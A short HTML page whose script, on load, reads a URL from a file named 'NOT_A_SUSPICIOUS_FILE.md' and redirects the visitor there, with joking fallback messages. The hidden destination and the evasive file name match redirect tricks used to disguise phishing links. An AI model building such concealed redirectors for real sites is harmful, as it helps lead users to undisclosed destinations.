<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>you are going to wherever...</title>
</head>
<body>
    <p>SOON.</p>

    <script>
        
        fetch('NOT_A_SUSPICIOUS_FILE.md')
            .then(response => response.text())
            .then(url => {
                
                const targetUrl = url.trim();
                
               
                if (targetUrl) {
                    window.location.href = targetUrl;
                } else {
                    document.body.innerHTML = "<p>url empty or failed lol.</p>";
                }
            })
            .catch(error => {
                console.error('error:', error);
                document.body.innerHTML = "<p>lucky ahh bug.</p>";
            });
    </script>
</body>
</html>
